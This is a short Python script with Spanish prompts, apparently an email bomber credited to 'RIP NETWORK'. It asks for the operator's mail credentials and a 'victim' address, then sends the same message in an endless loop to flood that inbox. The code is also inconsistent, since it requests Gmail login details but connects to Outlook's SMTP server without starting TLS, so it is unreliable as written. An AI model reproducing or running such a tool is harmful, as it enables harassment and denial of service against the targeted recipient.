import smtplib, ssl
import os
import time
import getpass

#colores
negro = '\033[30m'
rojo = '\033[31m'
verde = '\033[32m'
amarillo = '\033[33m'
azul = '\033[34m'
rosado = '\033[35m'
calipso= '\033[36m'
blanco = '\033[37m'
cierre = '\033[39m'

#script
os.system("clear")
time.sleep(1.0)
print(amarillo+"Gracias por usarlo atte RIP NETWORK"+cierre)
time.sleep(2.0)
print(amarillo+"Vamos al Script"+cierre)
time.sleep(1.5)
os.system("clear")

try:
	file1 = open('Banner.txt', 'r')
	print(' ')
	file1.close()
except IOError:
	print('Banner Not found')

time.sleep(1.0)
print("\n")                                                                             
c=input(amarillo+"Ingresar su cuenta de Gmail :" + cierre)
time.sleep(1.0)
p=getpass.getpass(amarillo+"Ingresar su Contraseña :" + cierre)
time.sleep(1.0)
destinatario=input(amarillo+"Correo de la Victima:" + cierre)
time.sleep(1.0)
mensaje=input(azul+"Escriba el mensaje:" + cierre)

while True:
    context = ssl.create_default_context()

    server = smtplib.SMTP("smtp-mail.outlook.com", 587)
    server.login(c, p)
    server.sendmail(c, destinatario, mensaje)
    print(rojo+"Correo enviado"+cierre)

